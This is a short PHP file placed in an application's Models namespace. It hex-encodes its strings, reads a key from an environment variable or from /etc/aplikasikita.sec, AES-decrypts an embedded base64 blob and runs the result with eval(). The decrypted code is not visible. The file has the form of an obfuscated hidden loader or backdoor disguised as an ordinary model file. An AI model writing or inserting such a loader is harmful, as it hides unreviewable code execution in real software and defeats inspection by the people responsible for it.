<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('dLIMigd0+Uj52eUiVEl5pQ==');

$c=base64_decode(

'8d8EoyI7sAEG9DhpGE+9VRztuteCBwWIBiPYS9M+QZP30wTJXn0kpibjz3HFnr2PHg9FqFdQ1rw0' .
'S4P5nv8MbEev/SLPvfe4S1OSIRuJne8TeCNGn1+c57CsrtpdyJDBqz1VY6Q32KfqOyfe/MCcOt6a' .
'41KTGCI5S7HtZly0KlBmLZzMd/gzqnPKwWsmZNusnyj0Ag1DjzfHfyxiT/HAFIiizwj1rTAT182f' .
'aBt0wb234cXZO4yt0WTpyTa9H9z3LXgVWZioo/RliDV7haM7wMMsu73uQ87bnb7mxeRMHuU5vZ7J' .
'N2Mmzv+x1UFcMTIV4N4tJOthxlB3fBWqEHlrU7eyrP5EwFC6VhSaCf6DTANAhBdzwLCRB1jan1Dl' .
'mZzcQFw/y09HREt/lqxh2mWqJhV2FecY2xXeuqVjDsfK/mci8Xz8phTzKlpCrzr4wZMJ8lqhG5Y6' .
'/WnxZIZRmf+LK3EbBnJob9/Kncap0o6Ly8ihc5qi3+3TzltmfYsQD7CyxaxxiiywCcBlVcMN4vsj' .
'9ncj6yoSFSvAL8k/30NW7i5tYxYtdxmJvC35Cw9AZZQhlKleSfhdfROxF9LwhcpGtXcS6aSjRdQX' .
'A3jb3a9zwJsd4fHCnXv82ORbFEgY7ahO+8qSLa2dnDPagjSQ//kjaQDL0R5OERAUmZNv3I7VGX7P' .
'Iwvzwy+i9Rgk9rVeVMSqJgAqaN4X4Fc+YeTnYjeBL15EZkXsMgpGYROYA7e5Tb6WyHH6aw+XgdOB' .
'inF7O+S6xOhmoTMlYeCY68M0e13zGIEa4IEwnipAEL6ALkow8HlS+bCWg3RWG3w5oR7KKY3l5PQE' .
'Ey+bGqQ++GPxpAGiyt5FhmeQ1TjhryzyFXh0qmex58hogBbBcZfr8Rx99TKfK3PzNdLtBunkqSkY' .
'YdZAQgcO21YyuoznIuN9shTkU7YpC6e+2mr8iNIpmHGRH1de/FgQS3CiSnxDu8SHuFRSDQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

